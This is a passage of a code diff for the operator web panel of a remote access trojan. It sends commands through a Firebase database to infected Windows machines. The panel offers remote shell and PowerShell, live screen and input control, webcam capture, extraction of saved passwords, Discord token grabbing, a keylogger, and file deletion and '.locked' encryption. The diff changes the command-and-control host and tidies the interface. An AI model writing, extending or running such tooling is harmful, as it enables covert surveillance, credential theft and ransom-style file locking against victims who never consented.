-      <button class="btn btn-ghost btn-sm" onclick="sendSystemCmd('logoff')">Logoff</button>
-      <span class="sep">|</span>
-      <button class="btn btn-accent btn-sm" onclick="showMsgBox()">MsgBox</button>
-      <button class="btn btn-ghost btn-sm" onclick="getClipboardText()">Clipboard</button>
-      <button class="btn btn-ghost btn-sm" onclick="getIdleTime()">Idle</button>
-      <button class="btn btn-ghost btn-sm" onclick="getUptime()">Uptime</button>
+  <div class="panel" id="p-sys">
+    <div class="bar">
+      <span class="lb">Power:</span>
+      <button class="btn btn-d btn-sm" onclick="sysCmd('shutdown')">Shutdown</button>
+      <button class="btn btn-o btn-sm" onclick="sysCmd('restart')">Restart</button>
+      <button class="btn btn-g btn-sm" onclick="sysCmd('lock')">Lock</button>
+      <button class="btn btn-g btn-sm" onclick="sysCmd('logoff')">Logoff</button>
+      <span class="sp">|</span>
+      <button class="btn btn-a btn-sm" onclick="showMsg()">MsgBox</button>
+      <button class="btn btn-g btn-sm" onclick="getClip()">Clip</button>
+      <button class="btn btn-g btn-sm" onclick="getIdle()">Idle</button>
+      <button class="btn btn-g btn-sm" onclick="getUp()">Uptime</button>
     </div>
-    <div class="ctrl-bar" style="margin-bottom:.5rem">
-      <span class="label">Volume:</span>
-      <input type="range" id="volSlider" min="0" max="100" value="50" style="flex:1;max-width:160px;accent-color:#818cf8;height:4px" oninput="setVolume(this.value)">
-      <span id="volVal" style="color:#e8edf5;font-size:.8rem;width:2.5rem">50</span>
-      <button class="btn btn-ghost btn-sm" onclick="sendVolume()">Set</button>
-      <span class="sep">|</span>
-      <span class="label">Wallpaper:</span>
-      <input id="wallInput" placeholder="C:\path\to\image.jpg" style="flex:1;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:8px;padding:.35rem .6rem;color:#e8edf5;font-size:.78rem;outline:none;max-width:200px;font-family:inherit">
-      <button class="btn btn-accent btn-sm" onclick="setWallpaper()">Set</button>
+    <div class="bar">
+      <span class="lb">Vol:</span>
+      <input type="range" id="volSl" min="0" max="100" value="50" style="flex:1;max-width:120px;accent-color:var(--acc);height:3px" oninput="volD.textContent=this.value">
+      <span id="volD" style="color:var(--txt);font-size:.75rem;width:2rem">50</span>
+      <button class="btn btn-g btn-sm" onclick="sendVol()">Set</button>
+      <span class="sp">|</span>
+      <span class="lb">Wall:</span>
+      <input class="inp" id="wallIn" placeholder="C:\path\img.jpg" style="flex:1;max-width:160px">
+      <button class="btn btn-a btn-sm" onclick="setWall()">Set</button>
     </div>
-    <div class="ctrl-bar" style="margin-bottom:.5rem">
-      <span class="label">Clipboard:</span>
-      <input id="clipWriteInput" placeholder="Text to set on clipboard..." style="flex:1;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:8px;padding:.35rem .6rem;color:#e8edf5;font-size:.78rem;outline:none;max-width:260px;font-family:inherit">
-      <button class="btn btn-accent btn-sm" onclick="setClipboardText()">Write</button>
+    <div class="bar">
+      <span class="lb">Clip:</span>
+      <input class="inp" id="clipIn" placeholder="Write text to clipboard..." style="flex:1;max-width:220px">
+      <button class="btn btn-a btn-sm" onclick="setClip()">Write</button>
+      <span class="sp">|</span>
+      <span class="lb">PS:</span>
+      <input class="inp" id="psIn" placeholder="ps command" style="flex:1;max-width:180px" spellcheck="false">
+      <button class="btn btn-a btn-sm" onclick="runPS()">Run</button>
+      <span class="sp">|</span>
+      <button class="btn btn-g btn-sm" onclick="loadSys()">Sys Info</button>
     </div>
-    <div class="ctrl-bar" style="margin-bottom:.5rem">
-      <span class="label">PowerShell:</span>
-      <input id="psInput" placeholder="command" style="flex:1;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:8px;padding:.35rem .6rem;color:#e8edf5;font-size:.78rem;outline:none;max-width:260px;font-family:inherit">
-      <button class="btn btn-accent btn-sm" onclick="runPowerShell()">Run</button>
-    </div>
-    <div class="ctrl-bar">
-      <span class="label">System Info:</span>
-      <button class="btn btn-ghost btn-sm" onclick="loadSysInfo()">⟳ Refresh Info</button>
-    </div>
-    <div id="sysInfoCards" class="sysinfo-grid" style="margin-bottom:.5rem;display:none"></div>
-    <div id="sysResult" class="scroll-output"><div class="loading">System commands ready</div></div>
+    <div id="sysGrid" class="grid" style="margin-bottom:.4rem;display:none"></div>
+    <div id="sysOut" class="scroll-out"><div class="loading">System ready</div></div>
     <div id="sysErr" class="err"></div>
   </div>
 
-  <div class="panel" id="panel-passwords">
-    <div class="capture-bar">
-      <button class="btn btn-orange" onclick="loadPasswords()">🔑 Extract Passwords</button>
-      <span style="color:rgba(255,255,255,.2);font-size:.75rem">WiFi + Windows Credentials</span>
-    </div>
-    <div id="pwResult" class="scroll-output"><div class="loading">Click to extract saved passwords</div></div>
+  <div class="panel" id="p-pw">
+    <div class="bar"><button class="btn btn-o" onclick="loadPW()">🔑 Extract Passwords</button><span style="color:var(--txt2);font-size:.7rem">WiFi + Windows Creds</span></div>
+    <div id="pwOut" class="scroll-out"><div class="loading">Click to extract</div></div>
     <div id="pwErr" class="err"></div>
   </div>
 
-  <div class="panel" id="panel-network">
-    <div class="capture-bar">
-      <button class="btn btn-cyan" onclick="loadNetworkInfo()">🌐 Get Network Info</button>
-    </div>
-    <div id="netResult" class="scroll-output"><div class="loading">Click to get network information</div></div>
+  <div class="panel" id="p-net">
+    <div class="bar"><button class="btn btn-c" onclick="loadNet()">🌐 Network Info</button></div>
+    <div id="netOut" class="scroll-out"><div class="loading">Click to get network info</div></div>
     <div id="netErr" class="err"></div>
   </div>
 
-  <div class="panel" id="panel-services">
-    <div class="capture-bar">
-      <button class="btn btn-purple" onclick="loadServices()">⚙ List Services</button>
-      <span id="svcCount" style="color:rgba(255,255,255,.2);font-size:.75rem"></span>
-    </div>
-    <div id="svcResult" class="scroll-output"><div class="loading">Click to list services</div></div>
+  <div class="panel" id="p-svc">
+    <div class="bar"><button class="btn btn-pu" onclick="loadSvc()">⚙ List Services</button><span id="svcCnt" style="color:var(--txt2);font-size:.7rem"></span></div>
+    <div id="svcOut" class="scroll-out"><div class="loading">Click to list services</div></div>
     <div id="svcErr" class="err"></div>
   </div>
 
-  <div class="panel" id="panel-apps">
-    <div class="capture-bar">
-      <button class="btn btn-accent" onclick="loadInstalledApps()">📦 List Installed Apps</button>
-      <span style="color:rgba(255,255,255,.2);font-size:.75rem">May take a moment</span>
-    </div>
-    <div id="appResult" class="scroll-output"><div class="loading">Click to list installed applications</div></div>
+  <div class="panel" id="p-app">
+    <div class="bar"><button class="btn btn-a" onclick="loadApps()">📦 Installed Apps</button><span style="color:var(--txt2);font-size:.7rem">May take a moment</span></div>
+    <div id="appOut" class="scroll-out"><div class="loading">Click to list apps</div></div>
     <div id="appErr" class="err"></div>
   </div>
 
-  <div class="panel" id="panel-files">
-    <div class="drop-zone" id="dropZone" ondragover="event.preventDefault();this.classList.add('drag-over')" ondragleave="this.classList.remove('drag-over')" ondrop="handleDrop(event)">
-      <span>Drop files here or <a onclick="document.getElementById('filePicker').click()" style="color:#818cf8;cursor:pointer;text-decoration:underline">browse</a></span>
-      <input type="file" id="filePicker" multiple style="display:none" onchange="handleFilePick(this)">
+  <div class="panel" id="p-files">
+    <div class="drop-zone" id="dropZ" ondragover="event.preventDefault();this.classList.add('drag')" ondragleave="this.classList.remove('drag')" ondrop="handleDrop(event)">
+      <span>Drop files or <a onclick="document.getElementById('fileP').click()" style="color:var(--acc);cursor:pointer">browse</a></span>
+      <input type="file" id="fileP" multiple style="display:none" onchange="handleFP(this)">
     </div>
-    <div class="files" id="filesBrowser">
-      <div class="loading">Click a directory to browse</div>
-    </div>
+    <div class="files" id="filesB"><div class="loading">Browse a directory</div></div>
     <div id="filesErr" class="err"></div>
   </div>
 
-  <div class="panel" id="panel-webcam">
-    <div class="capture-bar">
-      <button class="btn btn-primary" onclick="takeWebcam()">📷 Capture Webcam</button>
-    </div>
-    <div id="wcResult"><div class="loading">Click button to capture</div></div>
-    <div id="wcErr" class="err"></div>
+  <div class="panel" id="p-cam">
+    <div class="bar"><button class="btn btn-p" onclick="takeCam()">📷 Capture Webcam</button></div>
+    <div id="camOut"><div class="loading">Click to capture</div></div>
+    <div id="camErr" class="err"></div>
   </div>
 
-  <div class="panel" id="panel-tokens">
-    <div class="capture-bar">
-      <button class="btn btn-danger" onclick="grabTokens()">🔑 Grab Discord Tokens</button>
-    </div>
-    <div id="tokenResult" class="scroll-output"><div class="loading">Click to grab tokens</div></div>
-    <div id="tokenErr" class="err"></div>
+  <div class="panel" id="p-tokens">
+    <div class="bar"><button class="btn btn-d" onclick="grabTok()">🔑 Grab Discord Tokens</button></div>
+    <div id="tokOut" class="scroll-out"><div class="loading">Click to grab tokens</div></div>
+    <div id="tokErr" class="err"></div>
   </div>
 
-  <div class="panel" id="panel-hostinfo">
-    <div class="capture-bar">
-      <button class="btn btn-cyan" onclick="loadHostInfo()">💻 Get Host Info</button>
-      <button class="btn btn-ghost" onclick="loadEnvVars()">📋 Env Vars</button>
-      <button class="btn btn-ghost" onclick="takeScreenshotAll()">🖼 All Monitors</button>
+  <div class="panel" id="p-host">
+    <div class="bar">
+      <button class="btn btn-c" onclick="loadHost()">💻 Host Info</button>
+      <button class="btn btn-g" onclick="loadEnv()">📋 Env Vars</button>
+      <button class="btn btn-g" onclick="takeSSAll()">🖼 All Monitors</button>
     </div>
-    <div id="hostInfoCards" class="sysinfo-grid" style="margin-bottom:.5rem;display:none"></div>
-    <div id="hostResult" class="scroll-output"><div class="loading">Click to get detailed host information</div></div>
+    <div id="hostGrid" class="grid" style="margin-bottom:.4rem;display:none"></div>
+    <div id="hostOut" class="scroll-out"><div class="loading">Click for host info</div></div>
     <div id="hostErr" class="err"></div>
   </div>
 
-  <div class="panel" id="panel-keylog">
-    <div class="capture-bar">
-      <button class="btn btn-danger btn-sm" id="klStartBtn" onclick="startKeylogger()">▶ Start Keylogger</button>
-      <button class="btn btn-orange btn-sm" id="klStopBtn" onclick="stopKeylogger()" style="display:none">■ Stop</button>
-      <button class="btn btn-ghost" onclick="dumpKeylog()">📋 Dump Keys</button>
-      <span id="klStatus" style="color:rgba(255,255,255,.3);font-size:.75rem">Stopped</span>
+  <div class="panel" id="p-keylog">
+    <div class="bar">
+      <button class="btn btn-d btn-sm" id="klStart" onclick="startKL()">▶ Start</button>
+      <button class="btn btn-o btn-sm" id="klStop" onclick="stopKL()" style="display:none">■ Stop</button>
+      <button class="btn btn-g" onclick="dumpKL()">📋 Dump</button>
+      <span id="klStat" style="color:var(--txt2);font-size:.7rem">Stopped</span>
+      <button class="btn btn-g btn-sm" onclick="document.getElementById('klOut').innerHTML='<div class=\\'loading\\'>Dump keys</div>'" style="margin-left:auto">Clear</button>
     </div>
-    <div id="klResult" class="scroll-output"><div class="loading">Start keylogger to capture keystrokes</div></div>
+    <div id="klOut" class="scroll-out"><div class="loading">Start keylogger</div></div>
     <div id="klErr" class="err"></div>
   </div>
 
-  <div class="panel" id="panel-activity">
-    <div class="capture-bar">
-      <button class="btn btn-accent" onclick="loadActivityLog()">⟳ Refresh Log</button>
-      <button class="btn btn-ghost" onclick="document.getElementById('logResult').textContent='Cleared'">Clear</button>
+  <div class="panel" id="p-log">
+    <div class="bar">
+      <button class="btn btn-a" onclick="loadLog()">⟳ Refresh</button>
+      <button class="btn btn-g" onclick="document.getElementById('logOut').innerHTML='<div class=\\'loading\\'>Cleared</div>'">Clear</button>
     </div>
-    <div id="logResult" class="scroll-output"><div class="loading">Loading activity log...</div></div>
+    <div id="logOut" class="scroll-out"><div class="loading">Loading log...</div></div>
     <div id="logErr" class="err"></div>
   </div>
 </div>
@@ -328,373 +307,204 @@ select.mon:focus{border-color:rgba(88,100,255,.4)}
 <script>
 const FB = location.hostname==='localhost'||location.hostname==='127.0.0.1'
   ? 'http://'+location.hostname+':3000'
-  : 'https://solix-710c0-default-rtdb.europe-west1.firebasedatabase.app';
+  : 'https://lucaaverij-default-rtdb.europe-west1.firebasedatabase.app';
 const params=new URLSearchParams(window.location.search);
 const computer=params.get('name')||'';
 document.getElementById('name').textContent=computer||'Unknown';
 document.title=computer||'Client';
 
-(async()=>{
- try{
-  const r=await fetch(FB+'/pings/'+encodeURIComponent(computer)+'.json');
-  if(!r.ok)return;
-  const d=await r.json();
-  if(d)document.getElementById('meta').textContent='IP: '+(d.ip||'?')+' | Last: '+new Date(d.created_at).toLocaleString();
- }catch{}
-})();
+(async()=>{try{const r=await fetch(FB+'/pings/'+encodeURIComponent(computer)+'.json');if(!r.ok)return;const d=await r.json();if(d)document.getElementById('meta').textContent='IP: '+(d.ip||'?')+' | '+new Date(d.created_at).toLocaleString()}catch{}})();
 
-function switchTab(el,name){
- document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
- document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
- el.classList.add('active');
- document.getElementById('panel-'+name).classList.add('active');
- if(name==='files'&&!filePath)browseDir('');
- if(name==='processes')loadProcesses();
+// === Tab System ===
+const tabs=document.querySelectorAll('.tab');
+const panels={};
+document.querySelectorAll('.panel').forEach(p=>panels[p.id.replace('p-','')]=p);
+let currentTab='cmd';
+
+tabs.forEach(t=>{t.addEventListener('click',()=>switchTab(t.dataset.tab))});
+function switchTab(name){
+  tabs.forEach(t=>t.classList.toggle('active',t.dataset.tab===name));
+  Object.values(panels).forEach(p=>p.classList.remove('active'));
+  if(panels[name])panels[name].classList.add('active');
+  currentTab=name;
+  if(name==='files'&&!g_fp)browseDir('');
+  if(name==='proc')loadProc();
 }
 
-let g_fileEntries=null;
-function escAttr(t){return t.replace(/&/g,'&amp;').replace(/'/g,'\\&apos;').replace(/"/g,'&quot;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
-async function sendAndWait(type,payload,el,errId){
- const errEl=document.getElementById(errId);
- if(errEl)errEl.style.display='none';
- el.innerHTML='<div class="loading"><span class="spinner"></span>Sending...</div>';
- const cmdId='c'+Date.now().toString(36)+Math.random().toString(36).slice(2,10);
- const base=FB+'/commands/'+encodeURIComponent(computer);
- try{
-  const r=await fetch(base+'/'+cmdId+'.json',{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({computer,type,payload:payload||'',status:'pending'})});
-  if(!r.ok){el.innerHTML='<div class="loading">HTTP '+r.status+'</div>';if(errEl){errEl.textContent='Server returned '+r.status;errEl.style.display='block';}return null;}
-  el.innerHTML='<div class="loading"><span class="spinner"></span>Waiting for response...</div>';
-  for(let i=0;i<50;i++){
-   if(i)await new Promise(r=>setTimeout(r,100));
-   try{
-    const r2=await fetch(base+'.json');
-    if(!r2.ok)continue;
-    const all=await r2.json();
-    if(all&&all[cmdId]&&all[cmdId].status==='done'){
-     const row=all[cmdId];
-     fetch(base+'/'+cmdId+'.json',{method:'DELETE'}).catch(()=>{});
-     if(row.result==='exec_err'&&errEl){errEl.textContent='Execution error on client';errEl.style.display='block';}
-     return row;
-    }
-   }catch{}
+document.addEventListener('keydown',e=>{
+  if(e.ctrlKey&&e.key>='1'&&e.key<='9'){
+    e.preventDefault();const names=['cmd','ss','live','proc','sys','pw','net','svc','app'];const idx=parseInt(e.key)-1;
+    if(idx<names.length&&names[idx])switchTab(names[idx]);
   }
-  el.innerHTML='<div class="loading">Timeout — no response within 5s</div>';
-  if(errEl){errEl.textContent='Client did not respond';errEl.style.display='block';}
-  return null;
- }catch(e){el.innerHTML='<div class="loading">Error</div>';if(errEl){errEl.textContent=e.message||'unknown';errEl.style.display='block';}return null;}
-}
-
-async function runCmd(){
- const input=document.getElementById('cmdInput');
- const cmd=input.value.trim();if(!cmd)return;
- const out=document.getElementById('cmdOutput');
- out.textContent+='❯ '+cmd+'\n';input.value='';
- const res=await sendAndWait('cmd',cmd,out,'cmdErr');
- if(res){out.textContent+=(res.result||'(no output)')+'\n';out.scrollTop=out.scrollHeight;}
-}
-
-function copyCmdHistory(){
- const t=document.getElementById('cmdOutput').textContent;
- navigator.clipboard.writeText(t).then(()=>{
-  const d=document.createElement('div');d.className='toast';d.textContent='✓ Output copied to clipboard';document.body.appendChild(d);
-  setTimeout(()=>d.remove(),2000);
- });
-}
-
-async function takeScreenshot(){const el=document.getElementById('ssResult');const mon=document.getElementById('monSelect').value;const res=await sendAndWait('screenshot',mon,el,'ssErr');if(res&&res.result)el.innerHTML='<img class="screenshot" src="data:image/jpeg;base64,'+res.result+'">';else if(res)el.innerHTML='<div class="loading">Empty result</div>';}
-async function takeWebcam(){const el=document.getElementById('wcResult');const errEl=document.getElementById('wcErr');errEl.style.display='none';const res=await sendAndWait('webcam','',el,'wcErr');if(res&&res.result)el.innerHTML='<img class="screenshot" src="data:image/jpeg;base64,'+res.result+'">';else if(res)el.innerHTML='<div class="loading">Empty result</div>';}
-async function grabTokens(){const el=document.getElementById('tokenResult');const errEl=document.getElementById('tokenErr');errEl.style.display='none';const res=await sendAndWait('discord_tokens','',el,'tokenErr');if(res&&res.result)el.innerHTML='<pre style="margin:0;white-space:pre-wrap;word-break:break-all;font-size:.8rem;line-height:1.5">'+escHtml(res.result)+'</pre>';else if(res)el.innerHTML='<div class="loading">No tokens found</div>';}
-function escHtml(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
-
-let screenScale=1;
-async function startScreen(){
- document.getElementById('screenStartBtn').style.display='none';
- document.getElementById('screenStopBtn').style.display='';
- screenInterval=true;frameCount=0;fpsTime=Date.now();pollScreen();
-}
-
-async function pollScreen(){
- if(!screenInterval)return;
- try{
-  const r=await fetch(FB+'/live/'+encodeURIComponent(computer)+'.json');
-  if(r.ok){
-   const row=await r.json();
-   if(row&&row.result){
-    screenScale=parseFloat(row.scale)||1;
-    if(row.q){document.getElementById('liveQuality').value=row.q;document.getElementById('liveQualityVal').textContent=row.q;}
-    const t=new Date(row.created_at).getTime();
-    if(Date.now()-t<30000){
-     const el=document.getElementById('screenResult');const imgSrc='data:image/jpeg;base64,'+row.result;
-     if(el.querySelector('img')){el.querySelector('img').src=imgSrc;
-     }else{
-      el.innerHTML='<div class="screen-container"><img class="screenshot" id="screenImg" src="'+imgSrc+'"><canvas id="screenCanvas"></canvas></div>';
-      setupCanvas();if(mouseOn)setupMouseEvents();
-     }
-     pollLastTime=t;frameCount++;
-     if(Date.now()-fpsTime>=1000){
-      document.getElementById('screenFps').textContent=Math.round(frameCount/((Date.now()-fpsTime)/1000))+' fps';
-      frameCount=0;fpsTime=Date.now();
-     }
-    }else if(pollLastTime&&Date.now()-pollLastTime>15000){
-     const el=document.getElementById('screenResult');
-     if(!el.querySelector('.loading'))el.innerHTML='<div class="loading">Client disconnected</div>';
-     document.getElementById('screenFps').textContent='';
-    }
-   }else if(pollLastTime&&Date.now()-pollLastTime>15000){
-    const el=document.getElementById('screenResult');
-    if(!el.querySelector('.loading'))el.innerHTML='<div class="loading">Client disconnected</div>';
-    document.getElementById('screenFps').textContent='';
-   }
-  }
- }catch{}
-   setTimeout(pollScreen,100);
-}
-
-async function sendLiveConfig(){const q=document.getElementById('liveQuality').value;try{await fetch(FB+'/commands/'+encodeURIComponent(computer)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'live_config',payload:JSON.stringify({quality:parseInt(q)}),status:'pending'})});}catch{}}
-
-
-function setupCanvas(){const img=document.getElementById('screenImg');const c=document.getElementById('screenCanvas');if(!img||!c)return;const resize=()=>{c.width=img.clientWidth;c.height=img.clientHeight;c.style.width=img.clientWidth+'px';c.style.height=img.clientHeight+'px';};img.onload=resize;setTimeout(resize,100);}
-function getScreenCoords(e){const c=document.getElementById('screenCanvas');const img=document.getElementById('screenImg');if(!c||!img)return null;const rect=c.getBoundingClientRect();const s=screenScale||1;return{x:Math.round((e.clientX-rect.left)*img.naturalWidth/c.width/s),y:Math.round((e.clientY-rect.top)*img.naturalHeight/c.height/s)};}
-async function sendFireForget(type,payload){try{await fetch(FB+'/input/'+encodeURIComponent(computer)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type,payload:payload||''})});}catch{}}
-function setupMouseEvents(){const c=document.getElementById('screenCanvas');if(!c)return;c.style.cursor=mouseOn?'crosshair':'default';c.onmousedown=mouseOn?function(e){if(!mouseOn)return;const p=getScreenCoords(e);if(p)sendFireForget('mouse',JSON.stringify({x:p.x,y:p.y,action:'down'}));}:null;c.onmouseup=mouseOn?function(e){if(!mouseOn)return;const p=getScreenCoords(e);if(p)sendFireForget('mouse',JSON.stringify({x:p.x,y:p.y,action:'up'}));}:null;c.onmousemove=mouseOn?function(e){if(!mouseOn)return;const now=Date.now();if(now-mouseThrottle<50)return;mouseThrottle=now;const p=getScreenCoords(e);if(p)sendFireForget('mouse',JSON.stringify({x:p.x,y:p.y,action:'move'}));}:null;}
-function toggleMouse(){mouseOn=!mouseOn;const btn=document.getElementById('mouseBtn');btn.textContent=mouseOn?'ON':'OFF';btn.classList.toggle('active-toggle',mouseOn);setupMouseEvents();}
-function toggleKeyboard(){keyOn=!keyOn;const btn=document.getElementById('keyBtn');btn.textContent=keyOn?'ON':'OFF';btn.classList.toggle('active-toggle',keyOn);}
-document.addEventListener('keydown',function(e){if(!keyOn)return;if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA')return;e.preventDefault();sendFireForget('keyboard',JSON.stringify({key:e.keyCode,action:'down'}));});
-document.addEventListener('keyup',function(e){if(!keyOn)return;if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA')return;e.preventDefault();sendFireForget('keyboard',JSON.stringify({key:e.keyCode,action:'up'}));});
-function stopScreen(){screenInterval=false;document.getElementById('screenStartBtn').style.display='';document.getElementById('screenStopBtn').style.display='none';document.getElementById('screenFps').textContent='';document.getElementById('screenResult').innerHTML='<div class="loading">Stopped</div>';if(mouseOn)toggleMouse();if(keyOn)toggleKeyboard();}
-
-let filePath='',fileLoading=false;
-
-(async function initMonitors(){const sel=document.getElementById('monSelect');if(sel)sel.innerHTML='<option value="0">Monitor 1</option><option value="-1">All Monitors</option>';})();
-
-async function browseDir(path){
- if(fileLoading)return;fileLoading=true;
- try{path=decodeURIComponent(path)}catch{}
- const el=document.getElementById('filesBrowser');const errEl=document.getElementById('filesErr');
- errEl.style.display='none';
- el.innerHTML='<div class="loading"><span class="spinner"></span>Loading...</div>';
- const res=await sendAndWait('file_list',path,el,'filesErr');
- if(res&&res.result){filePath=path||'';renderFiles(res.result);}
- else if(res===null){el.innerHTML='<div class="loading">No response — is the client running?</div>';}
- fileLoading=false;
-}
-
-function renderFiles(json){
- const el=document.getElementById('filesBrowser');
- let entries;try{entries=JSON.parse(json)}catch{el.innerHTML='<div class="loading">Parse error</div>';return}
- if(!Array.isArray(entries)){el.innerHTML='<div class="loading">Bad response</div>';return}
- g_fileEntries=entries;
- let html='<div class="path"><span>'+esc(filePath||'This PC')+'</span>';
- if(filePath)html+='<button class="btn btn-ghost btn-sm" onclick="browseDir(\'\')">Root</button>';
- if(filePath){const p=filePath.replace(/\\+$/,'');const idx=p.lastIndexOf('\\');if(idx>0)html+='<button class="btn btn-ghost btn-sm" onclick="browseDir(\''+uenc(p.substr(0,idx+1))+'\')">Up</button>';}
- html+='</div>';
- for(let i=0;i<entries.length;i++){
-  const e=entries[i];const nm=e.n||'?';const isDir=e.d===true||e.d==='true';const sz=e.s||0;const dt=e.m||'';
-  const szStr=sz<1024?sz+' B':sz<1048576?(sz/1024).toFixed(1)+' KB':(sz/1048576).toFixed(1)+' MB';
-  const fp=filePath+nm;
-  html+='<div class="entry'+(isDir?' dir':'')+'">';
-  html+='<div class="ico '+(isDir?'folder':'file')+'" onclick="'+(isDir?"browseDir('"+uenc(fp+'\\')+"')":'')+'">'+(isDir?'📁':'📄')+'</div>';
-  html+='<div class="nm" onclick="'+(isDir?"browseDir('"+uenc(fp+'\\')+"')":'')+'">'+esc(nm)+'</div>';
-  html+=isDir?'<div class="sz"></div>':'<div class="sz">'+szStr+'</div>';
-  html+='<div class="dt">'+esc(dt)+'</div>';
-  if(!isDir){
-   html+='<div class="acts">';
-   html+='<button class="btn btn-ghost btn-xs" onclick="fileDownload('+i+')" title="Download">⬇</button>';
-   html+='<button class="btn btn-ghost btn-xs" onclick="fileRename('+i+')" title="Rename">✏️</button>';
-   html+='<button class="btn btn-ghost btn-xs" onclick="fileDeleteOp('+i+')" title="Delete">🗑️</button>';
-   html+='<button class="btn btn-ghost btn-xs" onclick="fileEncryptOp('+i+')" title="Encrypt">🔒</button>';
-   if(nm.endsWith('.locked'))html+='<button class="btn btn-ghost btn-xs" onclick="fileDecryptOp('+i+')" title="Decrypt">🔓</button>';
-   html+='</div>';
-  }else{
-   html+='<div class="acts"><button class="btn btn-ghost btn-xs" onclick="fileRename('+i+')" title="Rename">✏️</button>';
-   html+='<button class="btn btn-ghost btn-xs" onclick="fileDeleteOp('+i+')" title="Delete">🗑️</button></div>';
-  }
-  html+='</div>';
- }
- el.innerHTML=html;
-}
-
-function refreshLocalFiles(){
- if(!g_fileEntries||!Array.isArray(g_fileEntries))return;
- renderFiles(JSON.stringify(g_fileEntries));
-}
-async function fileDeleteOp(i){
- if(!g_fileEntries||!g_fileEntries[i])return;
- const nm=g_fileEntries[i].n||'';
- if(!confirm('Delete "'+nm+'"?'))return;
- const path=filePath+nm;
- const el=document.getElementById('filesBrowser');const errEl=document.getElementById('filesErr');
- errEl.style.display='none';el.innerHTML='<div class="loading">Deleting...</div>';
- const res=await sendAndWait('file_delete',path,el,'filesErr');
- if(res){g_fileEntries.splice(i,1);refreshLocalFiles();}
-}
-async function fileRename(i){
- if(!g_fileEntries||!g_fileEntries[i])return;
- const oldNm=g_fileEntries[i].n||'';
- const newName=prompt('New name:',oldNm);if(!newName||newName===oldNm)return;
- const path=filePath+oldNm;
- const el=document.getElementById('filesBrowser');const errEl=document.getElementById('filesErr');
- errEl.style.display='none';el.innerHTML='<div class="loading">Renaming...</div>';
- const res=await sendAndWait('file_rename',JSON.stringify({path,name:newName}),el,'filesErr');
- if(res){g_fileEntries[i].n=newName;refreshLocalFiles();}
-}
-async function fileEncryptOp(i){
- if(!g_fileEntries||!g_fileEntries[i])return;
- const nm=g_fileEntries[i].n||'';
- if(!confirm('Encrypt "'+nm+'"?'))return;
- const path=filePath+nm;
- const el=document.getElementById('filesBrowser');const errEl=document.getElementById('filesErr');
- errEl.style.display='none';el.innerHTML='<div class="loading">Encrypting...</div>';
- const res=await sendAndWait('file_encrypt',path,el,'filesErr');
- if(res){g_fileEntries[i].n=nm+'.locked';refreshLocalFiles();}
-}
-async function fileDecryptOp(i){
- if(!g_fileEntries||!g_fileEntries[i])return;
- const nm=g_fileEntries[i].n||'';
- if(!confirm('Decrypt "'+nm+'"?'))return;
- const path=filePath+nm;
- const el=document.getElementById('filesBrowser');const errEl=document.getElementById('filesErr');
- errEl.style.display='none';el.innerHTML='<div class="loading">Decrypting...</div>';
- const res=await sendAndWait('file_decrypt',path,el,'filesErr');
- if(res){
-  if(nm.endsWith('.locked'))g_fileEntries[i].n=nm.slice(0,-7);
-  else g_fileEntries[i].n+='.unlocked';
-  refreshLocalFiles();
- }
-}
-async function uploadFile(file){
- const path=filePath+file.name;
- const reader=new FileReader();
- reader.onload=async function(e){
-  const base64=e.target.result.split(',')[1];
-  const el=document.getElementById('filesBrowser');const errEl=document.getElementById('filesErr');
-  errEl.style.display='none';el.innerHTML='<div class="loading">Uploading '+esc(file.name)+'...</div>';
-  const res=await sendAndWait('file_upload',JSON.stringify({path,data:base64}),el,'filesErr');
-  if(res){
-   if(g_fileEntries&&Array.isArray(g_fileEntries)){
-    g_fileEntries.push({n:file.name,s:Math.round(base64.length*0.75),m:new Date().toISOString().slice(0,10),d:false});
-    refreshLocalFiles();
-   }else browseDir(filePath);
-  }
- };
- reader.readAsDataURL(file);
-}
-function handleDrop(e){
- e.preventDefault();document.getElementById('dropZone').classList.remove('drag-over');
- for(let f of e.dataTransfer.files)uploadFile(f);
-}
-function handleFilePick(input){
- for(let f of input.files)uploadFile(f);
- input.value='';
-}
-
-async function sendSystemCmd(type){
- const el=document.getElementById('sysResult');const err=document.getElementById('sysErr');
- err.style.display='none';
- if(type==='shutdown'||type==='restart'){if(!confirm('Confirm '+type+'?'))return}
- const res=await sendAndWait(type,'',el,'sysErr');
- if(res)el.innerHTML='<div style="color:#4ade80">✓ '+type+' executed</div>';
-}
-function showMsgBox(){const t=prompt('Message text:');if(!t)return;const ti=prompt('Title:','Remote');const el=document.getElementById('sysResult');el.innerHTML='<div class="loading"><span class="spinner"></span>Sending...</div>';sendAndWait('msgbox',JSON.stringify({text:t,title:ti||'Remote'}),el,'sysErr').then(r=>{if(r)el.innerHTML='<div style="color:#4ade80">✓ Message sent</div>';});}
-function setVolume(v){document.getElementById('volVal').textContent=v;}
-async function getClipboardText(){const el=document.getElementById('sysResult');const res=await sendAndWait('clipboard','',el,'sysErr');if(res)el.innerHTML='Clipboard: '+esc(res.result);}
-async function getIdleTime(){const el=document.getElementById('sysResult');const res=await sendAndWait('idle','',el,'sysErr');if(res)el.innerHTML='Idle time: '+esc(res.result)+' seconds';}
-async function getUptime(){const el=document.getElementById('sysResult');const res=await sendAndWait('uptime','',el,'sysErr');if(res)el.innerHTML='Uptime: '+esc(res.result)+' seconds ('+Math.floor(parseInt(res.result)/3600)+'h)';}
-async function runPowerShell(){const cmd=document.getElementById('psInput').value.trim();if(!cmd)return;const el=document.getElementById('sysResult');const err=document.getElementById('sysErr');err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Running...</div>';const res=await sendAndWait('powershell',cmd,el,'sysErr');if(res)el.innerHTML='<pre style="white-space:pre-wrap;margin:0">'+esc(res.result)+'</pre>';}
-
-async function loadSysInfo(){
